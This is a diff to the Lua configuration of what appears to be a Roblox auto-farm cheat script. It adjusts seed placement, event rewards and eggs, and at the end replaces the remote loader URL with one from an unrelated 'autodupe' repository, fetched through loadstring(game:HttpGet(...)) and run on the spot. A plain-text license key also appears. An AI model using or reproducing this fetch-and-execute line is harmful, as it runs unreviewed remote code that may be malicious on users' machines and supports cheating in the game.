@@ -51,16 +51,7 @@ getgenv().ConfigsKaitun = {
 			}
 		},
 		Place = {
-			Mode = "Select", -- Select , Lock
-                                                                Select = {
-				"Blueberry",
-				"Strawberry",
-				"Apple",
-				"Coconut",
-				"Dragon Fruit",
-				"Mango",
-				"Tomato",
-				"Cactus",
+			Mode = "Lock", -- Select , Lock                                                                Select = {
 			},
 			Lock = {
 				"Maple Apple",
@@ -86,8 +77,11 @@ getgenv().ConfigsKaitun = {
                                        ["Fairy Event"] = {
 			Minimum_Money = 10_000_000, -- minimum money to start play this event
 			Rewards_Item = {
-				"FairyPoints",
+				"Pet Shard Glimmering",
 				"Enchanted Egg",
+				"Mutation Spray Glimmering",
+				"FairyPoints",
+				"Fairy Targeter",
 				"Enchanted Seed Pack",
 			},
 			Upgrade = {
@@ -144,6 +138,7 @@ getgenv().ConfigsKaitun = {
 
 	Eggs = {
 		Place = {
+			"Enchanted Egg",
 			"Gourmet Egg",
 			"Sprout Egg",
 		},
@@ -250,4 +245,4 @@ getgenv().ConfigsKaitun = {
 	},
 }
 License = "f9mQH5jwFyPfR2gpzuUSXLdhzfCuCQaq"
-loadstring(game:HttpGet('https://raw.githubusercontent.com/Real-Aya/Loader/main/Init.lua'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/VietAnh1888/autodupe/refs/heads/main/hehe'))()
